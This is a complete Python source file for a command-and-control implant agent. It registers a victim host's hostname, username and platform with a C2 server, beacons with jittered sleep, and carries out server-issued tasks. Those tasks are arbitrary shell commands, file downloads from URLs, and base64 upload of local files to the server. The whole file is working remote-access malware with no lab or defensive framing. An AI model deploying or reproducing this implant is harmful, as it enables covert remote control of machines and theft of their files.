import os, time, random, base64, platform, subprocess
from typing import Dict, Any, Optional, List
import requests

class Agent:
    def __init__(self, base_url: str, agent_key: str, sleep: float = 5.0, jitter: float = 0.3, session: Optional[requests.Session] = None):
        self.base_url = base_url.rstrip('/')
        self.agent_key = agent_key
        self.sleep = sleep
        self.jitter = jitter
        self.agent_id: Optional[str] = None
        self.session = session or requests.Session()
        self.version = "0.1"

    def _headers(self) -> Dict[str, str]:
        h = {"X-Agent-Key": self.agent_key}
        if self.agent_id:
            h["X-Agent-Id"] = self.agent_id
        return h

    def register(self):
        payload = {
            "hostname": platform.node(),
            "platform": f"{platform.system()} {platform.release()} ({platform.machine()})",
            "username": os.environ.get("USER") or os.environ.get("USERNAME"),
            "pid": os.getpid(),
            "arch": platform.machine(),
            "agent_version": self.version,
        }
        r = self.session.post(f"{self.base_url}/register", json=payload, headers=self._headers(), timeout=10)
        r.raise_for_status()
        d = r.json()
        self.agent_id = d["agent_id"]
        self.sleep = d.get("sleep", self.sleep)
        self.jitter = d.get("jitter", self.jitter)
        return d

    def _exec_cmd(self, cmd: str) -> Dict[str, Any]:
        cp = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return {"ok": True, "stdout": cp.stdout, "stderr": cp.stderr, "exit_code": cp.returncode}

    def _download(self, url: str, dest: str) -> Dict[str, Any]:
        try:
            with self.session.get(url, stream=True, timeout=30) as resp:
                resp.raise_for_status()
                with open(dest, 'wb') as f:
                    for chunk in resp.iter_content(chunk_size=8192):
                        if chunk:
                            f.write(chunk)
            return {"ok": True, "note": f"saved to {dest}"}
        except Exception as e:
            return {"ok": False, "stderr": str(e)}

    def _upload(self, path: str) -> Dict[str, Any]:
        try:
            with open(path, 'rb') as f:
                data = base64.b64encode(f.read()).decode()
            return {"ok": True, "data_b64": data, "note": f"uploaded {path}"}
        except Exception as e:
            return {"ok": False, "stderr": str(e)}

    def _handle_task(self, task: Dict[str, Any]):
        t = task.get("type")
        args = task.get("args", {})
        if t == "cmd":
            res = self._exec_cmd(args.get("cmd", ""))
        elif t == "download":
            res = self._download(args.get("url"), args.get("dest", "/tmp/download.bin"))
        elif t == "upload":
            res = self._upload(args.get("path"))
        elif t == "sleep":
            self.sleep = float(args.get("sleep", self.sleep))
            self.jitter = float(args.get("jitter", self.jitter))
            res = {"ok": True, "note": f"sleep set to {self.sleep}, jitter {self.jitter}"}
        else:
            res = {"ok": False, "stderr": f"unknown task type {t}"}
        payload = {"task_id": task.get("task_id"), **res}
        self.session.post(f"{self.base_url}/result", json=payload, headers=self._headers(), timeout=15)

    def once(self):
        status = {"cwd": os.getcwd(), "time": time.time()}
        r = self.session.post(f"{self.base_url}/beacon", json={"status": status, "capabilities": ["cmd","download","upload","sleep"]}, headers=self._headers(), timeout=15)
        r.raise_for_status()
        tasks = r.json().get("tasks", [])
        for t in tasks:
            self._handle_task(t)

    def run_loop(self, cycles: Optional[int] = None):
        if not self.agent_id:
            self.register()
        c = 0
        while cycles is None or c < cycles:
            self.once()
            base = self.sleep
            delta = base * self.jitter
            actual = base + random.uniform(-delta, delta)
            time.sleep(max(0.1, actual))
            c += 1

if __name__ == '__main__':
    base_url = os.environ.get('C2_URL', 'http://127.0.0.1:8000')
    key = os.environ.get('AGENT_KEY', 'dev_agent_key')
    cycles_env = os.environ.get('CYCLES')
    cycles = int(cycles_env) if cycles_env else None
    Agent(base_url, key).run_loop(cycles=cycles)
